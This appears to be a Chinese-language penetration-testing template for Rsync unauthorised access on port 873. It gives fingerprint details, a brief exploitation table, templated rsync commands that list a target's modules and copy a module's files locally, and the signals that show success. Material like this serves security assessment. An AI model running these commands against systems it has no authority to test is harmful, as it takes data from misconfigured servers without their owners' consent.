# Rsync 未授权访问 (common)

## 指纹特征
- 服务: Rsync
- 端口: 873 (默认)
- 条件: 模块配置为可读写且无需认证

## 利用矩阵
| 触发方式 | 依赖条件 | 权限要求 |
| :--- | :--- | :--- |
| 直接连接同步 | 服务未配置认证 | 无 |

## PoC 指令

通过 `rsync` 协议列出目录或同步文件。

**1. 列出同步模块**
```bash
rsync {{TARGET}}::
```

**2. 获取目录内容**
```bash
rsync -av {{TARGET}}::{{MODULE_NAME}} ./local_dir
```

## Success Signal
- **读取验证**: 成功列出远程服务器上的模块名称或文件列表。
- **状态验证**: 建立连接且无需输入密码。
